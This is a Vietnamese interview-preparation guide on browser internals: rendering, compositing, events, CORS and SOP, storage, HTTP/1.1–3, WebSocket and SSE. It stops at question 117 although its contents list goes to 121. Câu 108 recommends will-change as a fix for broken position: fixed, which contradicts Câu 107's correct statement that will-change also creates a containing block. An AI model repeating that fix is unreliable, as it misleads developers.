# 06. Browser & Web Platform - 17 Câu Hỏi Senior

> 17 câu hỏi nền tảng browser (Câu 105-121) - từ render pipeline, reflow/repaint, event, CORS, storage đến HTTP/2/3, WebSocket, Service Worker và PWA. Senior hiểu browser như một hệ điều hành thu nhỏ, không chỉ là nơi chạy React.

## Mục lục

- [Câu 105: Browser Render Pipeline - từ HTML đến pixel](#câu-105-browser-render-pipeline---từ-html-đến-pixel)
- [Câu 106: Reflow, Repaint và Composite - khác nhau thế nào?](#câu-106-reflow-repaint-và-composite---khác-nhau-thế-nào)
- [Câu 107: Composite Layer - khi nào tạo layer mới?](#câu-107-composite-layer---khi-nào-tạo-layer-mới)
- [Câu 108: position: fixed và composite layer](#câu-108-position-fixed-và-composite-layer)
- [Câu 109: transform vs top/left - vì sao transform mượt hơn?](#câu-109-transform-vs-topleft---vì-sao-transform-mượt-hơn)
- [Câu 110: Event Propagation - capturing, bubbling và delegation](#câu-110-event-propagation---capturing-bubbling-và-delegation)
- [Câu 111: CORS và Preflight - cơ chế chi tiết](#câu-111-cors-và-preflight---cơ-chế-chi-tiết)
- [Câu 112: Cookie vs localStorage vs sessionStorage](#câu-112-cookie-vs-localstorage-vs-sessionstorage)
- [Câu 113: Same-Origin Policy - là gì và vượt qua thế nào?](#câu-113-same-origin-policy---là-gì-và-vượt-qua-thế-nào)
- [Câu 114: HTTP/1.1 vs HTTP/2 vs HTTP/3 - tiến hóa](#câu-114-http11-vs-http2-vs-http3---tiến-hóa)
- [Câu 115: HTTP/2 chi tiết - multiplexing, header compression, priority](#câu-115-http2-chi-tiết---multiplexing-header-compression-priority)
- [Câu 116: WebSocket - handshake và full-duplex](#câu-116-websocket---handshake-và-full-duplex)
- [Câu 117: SSE vs WebSocket - khi nào chọn gì?](#câu-117-sse-vs-websocket---khi-nào-chọn-gì)
- [Câu 118: Service Worker - lifecycle và cache strategy](#câu-118-service-worker---lifecycle-và-cache-strategy)
- [Câu 119: PWA là gì? Manifest, installability và offline](#câu-119-pwa-là-gì-manifest-installability-và-offline)
- [Câu 120: Storage nâng cao - IndexedDB, Cache API, OPFS](#câu-120-storage-nâng-cao---indexeddb-cache-api-opfs)
- [Câu 121: Bảo mật Browser - XSS, CSRF, CSP và SOP/CORS](#câu-121-bảo-mật-browser---xss-csrf-csp-và-sopcors)

---

### Câu 105: Browser Render Pipeline - từ HTML đến pixel

**Trả lời Senior:**
Pipeline của Chromium (Blink) có 6 bước chính, mỗi bước đều có thể là bottleneck:

1.  **Parse HTML → DOM**: byte → character → token → node → DOM tree. Gặp `<script>` không `defer/async` sẽ block parse. `preload scanner` quét trước để tải resource sớm.
2.  **Parse CSS → CSSOM**: CSS là render-blocking, phải tải và parse xong mới tiếp. Selector phức tạp làm CSSOM chậm.
3.  **Render Tree**: kết hợp DOM + CSSOM, bỏ node `display: none`, `script`, `meta`. Mỗi node có style computed.
4.  **Layout (Reflow)**: tính geometry - vị trí, kích thước của mỗi node trong Render Tree, theo viewport, flex, grid. Layout là O(n), rất tốn.
5.  **Paint**: raster hóa - vẽ text, color, border, shadow vào layer (bitmap). Paint theo thứ tự stacking context.
6.  **Composite**: gộp các layer (đã paint) lại, áp transform/opacity trên compositor thread, rồi GPU đưa lên màn hình. `transform`, `opacity` chỉ chạy ở bước này nên rẻ.

```html
<!-- Pipeline minh họa -->
<html>
  <head>
    <!-- 1. HTML parse gặp link CSS -> block, tải CSSOM -->
    <link rel="stylesheet" href="/style.css" />
    <!-- defer không block parse -->
    <script src="/app.js" defer></script>
  </head>
  <body>
    <div style="width: 50%">Hello</div>
    <!-- Render Tree: div (visible) -->
    <!-- Layout: div width = 50% * viewport -->
    <!-- Paint: vẽ text Hello -->
    <!-- Composite: gộp layer -->
  </body>
</html>
```

```javascript
// Đo từng bước
// Performance tab: Parse HTML, Recalculate Style, Layout, Paint, Composite
// Rendering tab: Paint flashing, Layout Shift Regions

// Tối ưu pipeline
// - Giảm DOM node (< 1500)
// - Tránh CSS selector * , :nth-child phức tạp
// - Inline critical CSS, defer non-critical
// - Dùng content-visibility: auto cho below-fold (bỏ layout/paint khi ngoài viewport)
```

```css
/* content-visibility - bỏ layout/paint cho offscreen */
.offscreen {
  content-visibility: auto;
  contain-intrinsic-size: 500px; /* reserve size tránh CLS */
}
```

**Trade-off:** `content-visibility` tăng tốc nhưng làm `find-in-page` và `scrollTo` sai nếu không có `contain-intrinsic-size`. Hiểu pipeline để biết `transform` rẻ hơn `width`.

**Câu hỏi đào sâu:** Vì sao CSS là render-blocking còn JS là parser-blocking? `preload scanner` làm gì để giảm block?

---

### Câu 106: Reflow, Repaint và Composite - khác nhau thế nào?

**Trả lời Senior:**
Ba thao tác có chi phí tăng dần, và Senior phải biết thuộc tính nào trigger cái nào:

- **Reflow (Layout)**: tính lại geometry (vị trí, kích thước) của element và con cháu, có thể lan tới cả trang. Trigger: `width`, `height`, `margin`, `padding`, `display`, `position`, `top/left`, `font-size`, `offsetHeight` (đọc cũng trigger force reflow). Tốn nhất.
- **Repaint (Paint)**: vẽ lại pixel trong cùng geometry, không tính lại vị trí. Trigger: `color`, `background`, `visibility`, `box-shadow`, `outline`. Tốn trung bình.
- **Composite**: chỉ gộp layer, không tính layout hay vẽ lại. Trigger: `transform`, `opacity`. Rẻ nhất, chạy trên compositor thread, 60fps.

Thứ tự: Reflow → Repaint → Composite. Đổi `width` sẽ reflow + repaint + composite, đổi `color` chỉ repaint + composite, đổi `transform` chỉ composite.

```javascript
// Trigger reflow
element.style.width = '100px'; // reflow + repaint + composite
element.style.display = 'none'; // reflow
console.log(element.offsetHeight); // đọc -> force reflow (layout thrashing)

// Trigger repaint
element.style.color = 'red'; // repaint + composite
element.style.background = 'blue'; // repaint

// Trigger composite only
element.style.transform = 'translateX(100px)'; // composite only - rẻ
element.style.opacity = '0.5'; // composite only

// Layout thrashing - đọc/ghi xen kẽ
// ❌
for (let i = 0; i < els.length; i++) {
  const h = els[i].offsetHeight; // đọc - force reflow
  els[i].style.height = h + 10 + 'px'; // ghi - invalidate
}
// ✅ Batch
const heights = els.map(el => el.offsetHeight); // đọc hết
els.forEach((el, i) => (el.style.height = heights[i] + 10 + 'px')); // ghi hết

// CSS containment - cô lập reflow
.container {
  contain: layout paint; /* reflow trong container không lan ra ngoài */
}
```

**Trade-off:** Dùng `transform` thay `top/left` để chỉ composite, nhưng `transform` không ảnh hưởng layout (không đẩy element khác), nên không phải lúc nào cũng thay thế được.

**Câu hỏi đào sâu:** Thuộc tính nào trigger reflow, repaint, composite? Vì sao đọc `offsetHeight` lại force reflow?

---

### Câu 107: Composite Layer - khi nào tạo layer mới?

**Trả lời Senior:**
Composite layer là **bitmap riêng** được GPU quản lý, gộp lại ở bước composite. Tạo layer mới giúp **isolate paint** - đổi `transform` của 1 layer không cần repaint layer khác, và có thể chạy trên compositor thread.

Browser tự tạo layer khi:

1.  `transform: translateZ(0)` / `translate3d(0,0,0)` / `will-change: transform` (hint)
2.  `position: fixed` (luôn composited)
3.  `video`, `canvas`, `iframe`
4.  `animation` với `transform`/`opacity`
5.  `z-index` cao trong stacking context với `will-change`
6.  `filter`, `backdrop-filter`

Xem trong DevTools: `Layers` panel hoặc `Rendering → Layer borders`.

```css
/* Tạo layer chủ động */
.animate {
  will-change: transform; /* hint browser, tạo layer trước khi animate */
  transform: translateZ(0); /* hack cũ, ép layer */
}

/* Sau animate nên remove will-change để tiết kiệm memory */
.animate {
  transition: transform 0.3s;
}
.animate:hover {
  will-change: transform;
}
.animate:active {
  transform: translateX(100px);
}
```

```javascript
// JS - promote
element.style.willChange = 'transform';
element.addEventListener('transitionend', () => {
  element.style.willChange = 'auto'; // xóa sau khi xong
});

// Check layer
// DevTools -> More Tools -> Layers
// Rendering -> Layer borders (viền cam là layer)

// Đo memory
// Mỗi layer là 1 bitmap: width * height * 4 bytes
// 1920x1080 layer = 8MB GPU memory
```

**Trade-off:** Layer tốn GPU memory (mỗi layer vài MB), tạo 100 layer làm memory phình, composite chậm hơn. Chỉ tạo cho element thực sự animate/scroll, không `will-change: transform` cho hết trang. Luôn xóa `will-change` sau khi xong. Lưu ý: `will-change` cũng tạo stacking context và containing block như `transform`, nên cũng có thể phá `position: fixed` của con cháu — không lạm dụng.

**Câu hỏi đào sâu:** `will-change` lạm dụng gây gì? Vì sao `position: fixed` luôn có layer riêng? Làm sao đo GPU memory của layer?

---

### Câu 108: position: fixed và composite layer

**Trả lời Senior:**
`position: fixed` luôn được **promote lên composite layer riêng** vì: 1) Nó **không scroll cùng document**, phải gộp sau cùng trên compositor; 2) Nó **không bị ảnh hưởng bởi layout** của parent, nên isolate reflow; 3) Browser có thể **composite fixed layer mà không cần repaint** khi scroll - đó là lý do `fixed` header mượt.

Cơ chế: `fixed` tạo **stacking context** mới, và compositor giữ layer đó cố định trong viewport, chỉ composite các layer khác khi scroll. Nếu không có layer riêng, mỗi scroll phải reflow/repaint fixed element.

Lưu ý: `transform` trên ancestor sẽ **phá fixed** - `fixed` sẽ fixed theo ancestor có `transform`/`filter`/`perspective` (vì ancestor đó tạo containing block mới). Đây là bug kinh điển.

```css
/* Fixed luôn composited */
.header {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  height: 60px;
  z-index: 100;
  /* Browser tự tạo layer, không cần will-change */
}

/* Bug: transform trên parent phá fixed */
.parent {
  transform: translateX(0); /* tạo containing block */
}
.child-fixed {
  position: fixed; /* giờ fixed theo .parent, không phải viewport! */
  top: 0;
}

/* Fix: không đặt transform trên ancestor của fixed, hoặc dùng will-change thay transform nếu không cần */
/* Hoặc đặt fixed ở body trực tiếp */
```

```javascript
// Kiểm tra fixed có layer không
// DevTools -> Layers -> chọn fixed element -> Compositing Reasons: "position: fixed"

// Performance: fixed + scroll
// - Scroll thường: compositor chỉ move scrolling layer, fixed layer giữ nguyên -> 60fps
// - Nếu fixed không composited: mỗi scroll phải repaint fixed -> jank

// Tránh bug
// ❌
<div style="transform: translateZ(0)">
  <div style="position: fixed; top: 0">Broken fixed</div>
</div>
// ✅
<div style="will-change: transform"> {/* will-change không tạo containing block cho fixed như transform */}
  <div style="position: fixed; top: 0">OK</div>
</div>
```

**Trade-off:** `fixed` mượt nhưng tốn 1 layer, và `fixed` + `input` trên iOS có bug keyboard đẩy viewport. Dùng `sticky` khi muốn fixed trong container, nhưng `sticky` không luôn composited.

**Câu hỏi đào sâu:** Vì sao `transform` trên parent lại làm `position: fixed` bị "kẹt"? `sticky` khác `fixed` thế nào về compositing?

---

### Câu 109: transform vs top/left - vì sao transform mượt hơn?

**Trả lời Senior:**
`top`/`left` là **layout property** - đổi `top: 10px → 100px` sẽ **reflow** (tính lại vị trí), **repaint**, rồi **composite**. Mỗi frame phải chạy cả pipeline, main thread bận, FPS thấp, đặc biệt với nhiều element.

`transform: translateX(100px)` là **composite property** - chỉ chạy **composite** trên compositor thread (GPU), không reflow, không repaint (nếu đã có layer). Compositor thread riêng biệt với main thread, nên dù main thread đang bận JS, animation `transform` vẫn 60fps. Đó là lý do mọi animation mượt đều dùng `transform` + `opacity`.

Thêm nữa, `transform` dùng **sub-pixel** và GPU interpolation, còn `top/left` làm tròn pixel gây giật.

```css
/* ❌ Lag: top/left - reflow mỗi frame */
.box {
  position: absolute;
  top: 0;
  left: 0;
  transition: left 0.3s;
}
.box.move {
  left: 100px; /* reflow + repaint + composite */
}

/* ✅ Mượt: transform - composite only */
.box {
  transition: transform 0.3s;
  will-change: transform; /* tạo layer trước */
}
.box.move {
  transform: translateX(100px); /* composite only */
}

/* So sánh pipeline */
/* top/left:  Layout -> Paint -> Composite (main thread) */
/* transform: Composite only (compositor thread) */
```

```javascript
// Đo
// Performance tab: với top/left sẽ thấy Layout (purple) mỗi frame
// với transform chỉ thấy Composite (green) hoặc không gì (compositor)

// Lưu ý: transform không ảnh hưởng layout
// top: 100px đẩy element khác
// transform: translateY(100px) không đẩy - chỉ visual, layout vẫn ở chỗ cũ
// => không phải lúc nào cũng thay thế được, ví dụ dropdown cần đẩy content thì phải dùng layout

// Kết hợp
// Animation: transform + opacity
// Layout shift: top/left nhưng batch + rAF
```

**Trade-off:** `transform` không trigger reflow nên không đẩy layout - nếu cần layout shift thật (như accordion) thì phải dùng `height`/`grid` và chấp nhận cost, hoặc dùng `transform` + JS đo height. Đừng cố dùng `transform` cho mọi thứ.

**Câu hỏi đào sâu:** Vì sao `transform` không gây reflow? Compositor thread khác main thread thế nào? Khi nào buộc phải dùng `top/left` thay vì `transform`?

---

### Câu 110: Event Propagation - capturing, bubbling và delegation

**Trả lời Senior:**
DOM Event có 3 phase: **Capturing** (window → document → ... → target parent), **Target** (tới element), **Bubbling** (target → parent → ... → window). Mặc định `addEventListener` là bubbling (`capture: false`). Đặt `capture: true` để bắt ở capturing.

**Delegation** tận dụng bubbling: đặt 1 listener trên parent để xử lý cho nhiều child (kể cả child thêm động), giảm memory, giảm listener, và handle dynamic DOM.

React Synthetic Event (trước 17) delegate lên `document`, từ 17 delegate lên `root` để isolate micro-frontend.

```javascript
// 3 phase
div.addEventListener('click', () => console.log('capture'), true); // capturing
div.addEventListener('click', () => console.log('bubble'), false); // bubbling
// Thứ tự: capture (window->target) -> target -> bubble (target->window)

// Delegation
document.querySelector('#list').addEventListener('click', e => {
  const btn = e.target.closest('button[data-id]');
  if (!btn) return;
  console.log('click', btn.dataset.id);
  // e.target là element thực click, e.currentTarget là #list
});

// Ngăn chặn
e.stopPropagation(); // chặn capture/bubble tiếp, nhưng không chặn listener khác trên cùng element
e.stopImmediatePropagation(); // chặn cả listener khác trên cùng element
e.preventDefault(); // chặn hành vi mặc định (submit, link), không chặn propagation

// React
function List() {
  const onClick = e => {
    e.stopPropagation(); // chỉ chặn trong React tree (từ 17), không chặn native document listener
    console.log(e.target, e.currentTarget);
    console.log(e.nativeEvent); // native event gốc
  };
  return <div onClick={onClick}><button>Click</button></div>;
}

// Event không bubble: focus, blur, load, mouseenter/leave
// Dùng focusin/focusout hoặc capture để delegate focus
document.addEventListener('focus', handler, true); // capture để bắt focus
```

**Trade-off:** Delegation tiết kiệm nhưng `e.target` có thể là descendant sâu, cần `closest`. Không delegate được event không bubble nếu không dùng capture.

**Câu hỏi đào sâu:** Vì sao React 17 đổi delegation từ `document` sang `root`? `stopPropagation` trong React có chặn được native listener trên `document` không?

---

### Câu 111: CORS và Preflight - cơ chế chi tiết

**Trả lời Senior:**
CORS (Cross-Origin Resource Sharing) là **cơ chế browser** cho phép server nói "tôi cho phép origin X đọc response của tôi". Mặc định **Same-Origin Policy** chặn JS đọc response khác origin (dù request vẫn gửi). CORS là **nới lỏng** có kiểm soát.

Phân hai loại:

- **Simple Request**: `GET/POST/HEAD` + header safelist (`Accept`, `Content-Type: text/plain|form-urlencoded|multipart`), không `custom header`, không `credentials` phức tạp. Browser gửi thẳng, check `Access-Control-Allow-Origin` ở response.
- **Preflight**: request "không simple" (`PUT`, `DELETE`, `Content-Type: application/json`, `Authorization`, custom header). Browser gửi **OPTIONS** trước để hỏi server, server trả `Access-Control-Allow-Methods`, `Allow-Headers`, `Max-Age`, rồi mới gửi request thật.

```http
# Simple
GET /api/data HTTP/1.1
Origin: https://app.example.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
Vary: Origin

# Preflight
OPTIONS /api/data HTTP/1.1
Origin: https://app.example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Content-Type, Authorization

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400
Access-Control-Allow-Credentials: true

# Sau đó mới
PUT /api/data HTTP/1.1
Origin: https://app.example.com
Content-Type: application/json
Authorization: Bearer xxx
```

```javascript
// Fetch với CORS
fetch('https://api.example.com/data', {
  mode: 'cors', // default
  credentials: 'include', // gửi cookie, cần server Allow-Credentials + không được Allow-Origin: *
});

// Server (Express)
import cors from 'cors';
app.use(cors({
  origin: 'https://app.example.com',
  credentials: true,
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 86400,
}));

// Lỗi phổ biến
// - Allow-Origin: * với credentials: true -> browser block
// - Thiếu Vary: Origin -> CDN cache sai origin
// - Preflight Max-Age không set -> mỗi request lại OPTIONS
```

**Trade-off:** `Allow-Origin: *` tiện nhưng không dùng được với `credentials`. Preflight thêm 1 RTT, nên `Max-Age` để cache, và tránh custom header không cần thiết để thành simple.

**Câu hỏi đào sâu:** Vì sao `Content-Type: application/json` lại trigger preflight còn `text/plain` thì không? `Vary: Origin` để làm gì với CDN?

---

### Câu 112: Cookie vs localStorage vs sessionStorage

**Trả lời Senior:**
Ba storage khác nhau về **lifecycle, scope, gửi kèm request, dung lượng, bảo mật**:

| | Cookie | localStorage | sessionStorage |
|---|---|---|---|
| Dung lượng | 4KB/cookie, ~20 cookie/domain | 5-10MB | 5-10MB |
| Gửi kèm request | **Có** (tự động với mọi request cùng domain) | Không | Không |
| Lifecycle | `Expires`/`Max-Age` hoặc session | Vĩnh viễn tới khi xóa | Per tab, xóa khi đóng tab |
| Scope | Per domain + path, share giữa tab | Per origin, share giữa tab | Per origin + per tab |
| Access | `document.cookie` (nếu không HttpOnly) + server `Set-Cookie` | `localStorage.getItem` | `sessionStorage` |
| Sync | Đồng bộ, block main thread | Đồng bộ | Đồng bộ |

Cookie dùng cho **auth token, session, tracking** vì tự gửi. Nhưng tự gửi cũng là rủi ro CSRF. `HttpOnly` chặn JS đọc, `Secure` chỉ HTTPS, `SameSite=Lax/Strict` chặn CSRF.

`localStorage` cho **cache, theme, draft** - persist giữa session, nhưng **đồng bộ** nên đọc/ghi nhiều sẽ block, và **XSS đọc được** nên không lưu token nhạy cảm.

```javascript
// Cookie
document.cookie = 'theme=dark; Max-Age=31536000; Path=/; SameSite=Lax; Secure';
// Server
res.setHeader('Set-Cookie', 'session=abc123; HttpOnly; Secure; SameSite=Strict; Max-Age=3600; Path=/');

// localStorage
localStorage.setItem('draft', JSON.stringify({ title: 'hello' }));
const draft = JSON.parse(localStorage.getItem('draft') ?? 'null');
localStorage.removeItem('draft');
// Lưu ý: chỉ string, đồng bộ, 5MB
// Quá 5MB -> QuotaExceededError

// sessionStorage - per tab
sessionStorage.setItem('tabId', crypto.randomUUID());
// Đóng tab mất, tab mới không thấy

// Bảo mật
// ❌ localStorage.setItem('token', jwt) // XSS đọc được
// ✅ Cookie HttpOnly + Secure + SameSite cho token
// Hoặc memory + refresh token rotation

// Dung lượng
// Cookie 4KB -> không lưu object lớn
// localStorage 5MB -> nén nếu cần: LZString.compress(JSON.stringify(data))
```

**Trade-off:** Cookie tự gửi tiện nhưng tốn bandwidth (mỗi request kèm cookie), và CSRF. localStorage không gửi nên tiết kiệm, nhưng phải tự gắn header, và XSS risk. Với auth hiện đại, ưu tiên **httpOnly cookie + SameSite** cho refresh token, **memory** cho access token.

**Câu hỏi đào sâu:** Vì sao không nên lưu JWT trong localStorage? `SameSite=Lax` vs `Strict` vs `None` khác gì và ảnh hưởng CSRF thế nào?

---

### Câu 113: Same-Origin Policy - là gì và vượt qua thế nào?

**Trả lời Senior:**
Same-Origin Policy (SOP) là **tường lửa cốt lõi của browser**: script từ origin A (scheme + host + port) **không được đọc** resource của origin B, dù vẫn gửi request được (nhưng không đọc response). SOP áp dụng cho `fetch`, `XHR`, `WebSocket` (handshake), `Canvas` (tainted), `localStorage`, `DOM` của iframe.

Mục đích: ngăn `evil.com` đọc `bank.com` khi user đăng nhập bank. Nếu không có SOP, `fetch('https://bank.com/api/balance')` từ `evil.com` sẽ đọc được số dư (vì cookie bank tự gửi).

Vượt qua an toàn (khi cần):

- **CORS**: server B cho phép A bằng `Access-Control-Allow-Origin`.
- **postMessage**: iframe B gửi data cho A qua `window.postMessage` có kiểm `origin`.
- **Proxy**: frontend gọi `/api` cùng origin, server proxy tới B (không qua browser).
- **JSONP** (cũ, không an toàn, chỉ GET).
- **document.domain** (deprecated), **window.name** (hack).

```javascript
// SOP block
fetch('https://bank.com/api/balance'); // từ evil.com -> browser block đọc response, dù request đã gửi (nếu không CORS)

// CORS - server bank cho phép
// bank.com: Access-Control-Allow-Origin: https://app.example.com

// postMessage - an toàn
// bank.com iframe
window.parent.postMessage({ balance: 1000 }, 'https://app.example.com');
// app.example.com
window.addEventListener('message', e => {
  if (e.origin !== 'https://bank.com') return; // phải check
  console.log(e.data.balance);
});

// Proxy - Next.js
// next.config.js
async rewrites() {
  return [{ source: '/api/bank/:path*', destination: 'https://bank.com/api/:path*' }];
}
// frontend fetch('/api/bank/balance') -> cùng origin, không SOP

// Canvas tainted
const img = new Image();
img.crossOrigin = 'anonymous'; // cần CORS header từ image server
img.src = 'https://cdn.com/photo.jpg';
img.onload = () => {
  canvas.drawImage(img, 0, 0);
  canvas.toDataURL(); // nếu không crossOrigin + CORS, sẽ tainted và lỗi
};
```

**Trade-off:** CORS là chuẩn, nhưng cần server config. Proxy đơn giản nhưng tốn server. `postMessage` phải check `origin` nếu không sẽ XSS.

**Câu hỏi đào sâu:** SOP chặn đọc response nhưng có chặn gửi request không? Vì sao `<img>` và `<script>` lại được cross-origin còn `fetch` thì không?

---

### Câu 114: HTTP/1.1 vs HTTP/2 vs HTTP/3 - tiến hóa

**Trả lời Senior:**
Tiến hóa để giải quyết **head-of-line blocking** và **latency**:

- **HTTP/1.1**: text, 1 request/response per TCP connection (hoặc 6 connection parallel với keep-alive), header không nén, HOL blocking ở TCP, phải domain sharding, sprite, concat.
- **HTTP/2**: binary framing, **multiplexing** (nhiều stream trên 1 TCP), **header compression (HPACK)**, **server push** (đã deprecated), **stream priority**. Giải quyết HOL ở HTTP layer nhưng vẫn HOL ở TCP (1 packet mất thì cả streams block vì TCP retransmit).
- **HTTP/3**: trên **QUIC (UDP)**, mỗi stream là QUIC stream riêng, **không HOL blocking ở transport**, handshake 0-RTT, migration khi đổi network (mobile). Nén header bằng QPACK.

```http
# HTTP/1.1 - 6 connection, queue
GET /a.js HTTP/1.1
Host: example.com
GET /b.js HTTP/1.1  # phải đợi a.js xong hoặc mở connection mới (max 6)

# HTTP/2 - 1 connection, multiplex
:method: GET
:path: /a.js
:authority: example.com
# stream 1, 3, 5 multiplex cùng lúc, không block

# HTTP/3 - QUIC, mỗi stream độc lập
# packet loss stream 1 không ảnh hưởng stream 3
```

```javascript
// Check version
// DevTools -> Network -> Protocol (h2, h3, http/1.1)
// hoặc
fetch('/').then(() => console.log(performance.getEntriesByType('navigation')[0].nextHopProtocol));

// Tối ưu theo version
// HTTP/1.1: concat, sprite, domain sharding, inline
// HTTP/2: không cần concat, split nhỏ, multiplex nên nhiều file nhỏ ok
// HTTP/3: như H2 nhưng tốt hơn cho lossy network (mobile)

// Server
// Nginx: listen 443 ssl http2;
// Cloudflare: tự H2/H3
// Node: http2.createSecureServer
```

**Trade-off:** H2 tốt hơn H1.1 mọi case, nên bật luôn. H3 tốt nhất cho mobile/lossy, nhưng UDP bị firewall chặn ở một số corp, và CPU cao hơn. Không phải tối ưu H1.1 (concat) còn hợp cho H2/H3 - ngược lại.

**Câu hỏi đào sâu:** Head-of-line blocking ở HTTP/1.1, HTTP/2 và TCP khác nhau thế nào? Vì sao HTTP/3 dùng QUIC thay vì TCP?

---

### Câu 115: HTTP/2 chi tiết - multiplexing, header compression, priority

**Trả lời Senior:**
HTTP/2 core là **binary framing + multiplexing**: 1 TCP connection chia thành nhiều **stream** (mỗi request là 1 stream), mỗi stream chia thành **frame** (HEADERS, DATA). Các frame của nhiều stream interleave trên cùng connection, không phải đợi. Giải quyết H1.1 queue.

- **HPACK**: nén header (vốn lặp lại: `cookie`, `user-agent`), dùng static table + dynamic table + Huffman, giảm 50-80% header size. QPACK cho HTTP/3 tương tự HPACK nhưng thiết kế cho QUIC, khắc phục head-of-line blocking.
- **Stream Priority**: client gửi `priority` (trước là dependency tree, nay là `Priority` header), server ưu tiên CSS trước JS, hero trước below-fold. Nhưng priority H2 phức tạp và browser implement khác nhau.
- **Server Push**: server đẩy resource trước khi client request (ví dụ đẩy `app.css` khi client request `/`). Đã deprecated vì cache không hiệu quả, thay bằng `103 Early Hints` + `preload`.

```http
# Multiplexing
# Connection 1: stream 1 (HTML), stream 3 (CSS), stream 5 (JS) interleave
# Frame: [Stream1 HEADERS] [Stream3 HEADERS] [Stream1 DATA] [Stream5 DATA] ...

# HPACK
# Request 1: :method: GET, :path: /, user-agent: xxx (gửi full)
# Request 2: :method: GET, :path: /style.css, user-agent: xxx (chỉ gửi index, không gửi lại)

# Priority (mới)
GET /critical.css HTTP/2
Priority: u=0, i  # urgency 0 cao nhất, incremental

# Early Hints thay Server Push
HTTP/1.1 103 Early Hints
Link: </style.css>; rel=preload; as=style
Link: </hero.jpg>; rel=preload; as=image
```

```javascript
// Priority với fetch
fetch('/api/critical', { priority: 'high' }); // Chrome
fetch('/api/non-critical', { priority: 'low' });

// Early Hints - server gửi trước khi HTML xong
// Node
res.writeEarlyHints({ link: '</style.css>; rel=preload; as=style' });

// Đo H2
// DevTools -> Network -> Waterfall: H2 multiplex nên nhiều request cùng start, không queue (Stalled ngắn)
// chrome://net-export
```

**Trade-off:** Multiplex làm nhiều file nhỏ không sao, nhưng quá nhiều stream (100+) vẫn tốn HPACK table và server memory. Priority H2 không hoàn hảo, nên dùng `fetchpriority`/`preload` để hint. Server Push đã bỏ, đừng dùng.

**Câu hỏi đào sâu:** Vì sao Server Push bị deprecated? `103 Early Hints` thay thế thế nào? HPACK khác QPACK (H3) thế nào?

---

### Câu 116: WebSocket - handshake và full-duplex

**Trả lời Senior:**
WebSocket là **full-duplex, persistent, single TCP connection** sau khi upgrade từ HTTP, cho phép server push real-time mà không cần polling. Dùng cho chat, collaborative, game, ticker.

Handshake: client gửi `GET` với `Upgrade: websocket` + `Sec-WebSocket-Key`, server trả `101 Switching Protocols` với `Sec-WebSocket-Accept` (hash key + magic string). Sau đó HTTP biến mất, còn lại frame WebSocket (opcode, payload, mask). Không còn header HTTP, overhead 2-14 byte/frame.

```http
# Handshake
GET /chat HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
# Sau đó là WebSocket frame, không phải HTTP nữa
```

```javascript
// Client
const ws = new WebSocket('wss://example.com/chat'); // wss = TLS
ws.onopen = () => {
  console.log('connected');
  ws.send(JSON.stringify({ type: 'join', room: 'general' }));
};
ws.onmessage = e => {
  const msg = JSON.parse(e.data);
  console.log('msg', msg);
};
ws.onclose = e => console.log('close', e.code, e.reason);
ws.onerror = e => console.error(e);

// Server (Node ws)
import { WebSocketServer } from 'ws';
const wss = new WebSocketServer({ port: 8080 });
wss.on('connection', ws => {
  ws.on('message', data => {
    // broadcast
    wss.clients.forEach(c => { if (c.readyState === 1) c.send(data); });
  });
});

// Heartbeat - quan trọng vì proxy/firewall đóng idle connection
setInterval(() => { if (ws.readyState === 1) ws.send(JSON.stringify({ type: 'ping' })); }, 30000);

// Reconnect với backoff
function connect() {
  const ws = new WebSocket('wss://example.com/chat');
  ws.onclose = () => setTimeout(connect, 1000 * Math.random() * 2);
}
```

**Trade-off:** WebSocket real-time, overhead thấp, nhưng **stateful** (server phải giữ connection, khó scale horizontally, cần sticky session hoặc pub/sub như Redis). Không tận dụng HTTP cache, và firewall/proxy có thể chặn. Dùng cho low-latency, high-frequency.

**Câu hỏi đào sâu:** WebSocket khác HTTP polling/long-polling thế nào về overhead? Làm sao scale WebSocket với nhiều server (sticky vs Redis pub/sub)?

---

### Câu 117: SSE vs WebSocket - khi nào chọn gì?

**Trả lời Senior:**
Cả hai đều server push, nhưng khác hướng và protocol:

- **SSE (Server-Sent Events)**: **unidirectional** (server → client), trên **HTTP**, dùng `EventSource`, tự reconnect, tự `Last-Event-ID`, text/event-stream, đơn giản, tận dụng HTTP/2 multiplex, firewall thân thiện, nhưng chỉ text, 1 chiều, 6 connection limit như HTTP.
- **WebSocket**: **bidirectional** (client ↔ server), trên **TCP riêng** sau upgrade, binary + text, full-duplex, overhead thấp, nhưng phức tạp, stateful, phải tự heartbeat/reconnect, không tự tận dụng HTTP/2.

Chọn:

- **SSE**: notification, feed, ticker, log stream, progress (server push 1 chiều, cần reconnect tự động, không cần client gửi nhiều). Đơn giản hơn 70%.
- **WebSocket**: chat, collaborative cursor, game, trading (cần client gửi liên tục, low latency, binary).

```javascript
// SSE - Server
// Node Express
app.get('/events', (req, res) => {
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    Connection: 'keep-alive',
  });
  const id = setInterval(() => {
    res.write(`id: ${Date.now()}\ndata: ${JSON.stringify({ time: Date.now() })}\n\n`);
  }, 1000);
  req.on('close', () => clearInterval(id));
});

// SSE - Client
const es = new EventSource('/events');
es.onmessage = e => console.log('msg', JSON.parse(e.data));
es.addEventListener('custom', e => console.log('custom', e.data));
es.onerror = () => console.log('reconnect tự động sau 3s');
// Tự gửi Last-Event-ID khi reconnect

// WebSocket - bidirectional
const ws = new WebSocket('wss://example.com/chat');
ws.onmessage = e => console.log(e.data);
ws.send(JSON.stringify({ type: 'chat', text: 'hello' })); // client gửi

// So sánh
// | | SSE | WebSocket |
// |---|---|---|
// | Hướng | 1 chiều | 2 chiều |
// | Protocol | HTTP | WS (upgrade) |
// | Reconnect | tự | tự code |
// | Binary | không | có |
// | HTTP/2 | có (multiplex) | không (riêng) |
// | Firewall | dễ | có thể chặn |
```

